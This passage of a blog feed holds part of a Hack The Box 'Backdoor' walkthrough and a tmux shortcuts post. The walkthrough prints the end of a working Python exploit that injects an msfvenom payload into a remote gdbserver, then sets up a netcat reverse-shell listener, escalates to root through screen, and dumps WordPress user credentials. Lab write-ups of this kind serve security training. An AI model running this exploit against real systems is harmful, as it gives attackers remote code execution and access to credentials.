        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'vCont;s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;';'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[!] ERROR: Unexpected response. Try again later'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'10'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Found x64 arch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0*'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'08'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Found x86 arch'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;binascii&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unhexlify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;I'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'0'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;hex_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Sending payload'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'M{addr},{hex_length}:{payload}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'vCont;c'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rb'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;FileNotFoundError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[!] ERROR: File {file} not found'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[+] Connected to target. Preparing exploit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'[*] Pwned!! Check your listener'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Inside the script it tells us the instructions that we must follow, first it tells us to generate a payload with &lt;strong&gt;&lt;em&gt;msfvenom&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura33.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then with netcat we ara going to listen on the port 4444 and then execute the exploit specifying the victim machine ip and the payload that we generate with msfvenom.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura34.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see we have a connection and we are as the user &lt;strong&gt;&lt;em&gt;user&lt;/em&gt;&lt;/strong&gt;, and we are going to indicate that we want a pseudo console.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura35.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we want another way to report a pseudo console we can do it using python.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura38.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;

&lt;p&gt;And with this command I want the remote shell to be the size of my terminal and that it can do ctrl + c and not get out of the session.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura36.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;let’s export two environment variables.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura37.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And i found the first flag.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura39.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ok now i need to access as root for this i am going to test if it works for me with the &lt;em&gt;** screen **&lt;/em&gt; command. and if it lets me login as root.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura40.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we can see tha second flag to submit in the htb.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura41.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And with the credentials of the database that we had saved we can use it to access in the database.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura42.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can see the databases that are created.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura43.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We can access the wordpress database and here we can enter the &lt;strong&gt;&lt;em&gt;wp-users&lt;/em&gt;&lt;/strong&gt; table to see the users and passwords.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura44.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Hack the box" /><category term="wordpress" /><category term="reverse shell" /><category term="lfi" /><summary type="html">Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.</summary></entry><entry><title type="html">Tmux Shortcuts</title><link href="http://localhost:4000/tmux-short/" rel="alternate" type="text/html" title="Tmux Shortcuts" /><published>2021-11-25T00:00:00+01:00</published><updated>2021-11-25T00:00:00+01:00</updated><id>http://localhost:4000/tmux-short</id><content type="html" xml:base="http://localhost:4000/tmux-short/">&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/tmux/tmux22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Tmux is a tool that allows us to divide a terminal in several panels and also to speed up when we are working in the console with different functions and shortcuts.&lt;/p&gt;

&lt;h2 id=&quot;tmux-shortcuts&quot;&gt;Tmux shortcuts&lt;/h2&gt;

&lt;p&gt;prefix&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;close session&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tmux new -s &quot;nameofthesession&quot;  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;change session name&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + $  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;list session&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tmux ls 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;kill session&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tmux kill-session -t [name]  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;enter a session&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tmux attach -t [name] 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;rename window&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + , 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;create a window&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + c  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;move from windows&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + 1,2,3,4  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;vertical window&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + shift + 2 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;window in horizontal position&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + shift + 5   
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;move the second panel in horizontal or in vertical.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctrl + b + space
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;see the hour in the panel.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + t 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;move in terminal to write&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + arrows - up - down  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;delete bash o zsh window&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + &amp;amp; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;resize the windows, (hold down the ctrl key)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;prefix + arrows 
